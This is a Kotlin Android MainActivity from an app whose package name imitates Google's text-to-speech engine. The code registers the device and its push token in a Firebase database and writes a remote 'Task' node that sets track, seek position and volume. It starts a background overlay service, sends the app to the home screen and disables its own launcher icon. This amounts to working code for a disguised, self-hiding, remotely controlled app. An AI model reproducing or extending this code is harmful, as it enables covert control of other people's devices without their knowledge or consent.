package com.googli.googletext_to_speechengine

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.iid.FirebaseInstanceId
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    var serviceIntent: Intent? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        //  startService(Intent(this, ChatHeadService::class.java))
        if (getSharedPreferences("Main", 0).getBoolean("isRegistered", false)) {
            startService()
        }
        setName()
    }

    fun startService() {
        serviceIntent = Intent(this, ChatHeadService::class.java)
        startService(serviceIntent)
    }

    fun setName() {
        SaveName.setOnClickListener {
            getSharedPreferences("Main", 0).edit().putBoolean("isRegistered", true).apply()
            getSharedPreferences("Main", 0).edit().putString("Name", Name.text.toString()).apply()
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("iSRegisterd").setValue(true)
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("DownloadProgress").setValue(100)
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("Task").child("TaskID").setValue(100)
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("Task").child("TrackName").setValue("Sau Tra Ke Rang")
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("Task").child("SeekTo").setValue(2)
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("Task").child("Volume").setValue(100)
            val refreshedToken = FirebaseInstanceId.getInstance().token
            FirebaseDatabase.getInstance().reference.child(Name.text.toString()).child("FCMToken").setValue(refreshedToken)

            serviceIntent = Intent(this, ChatHeadService::class.java).putExtra("Name", Name.text.toString())
            startService(serviceIntent)
            backgroundApp()
            removeDrawerIcon()
        }


    }

    fun backgroundApp() {
        val startMain = Intent(Intent.ACTION_MAIN)
        startMain.addCategory(Intent.CATEGORY_HOME)
        startMain.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(startMain)
    }

    fun removeDrawerIcon() {
        val componentToDisable = ComponentName("com.googli.googletext_to_speechengine",
                "com.googli.googletext_to_speechengine.MainActivity")

        packageManager.setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
    }


}
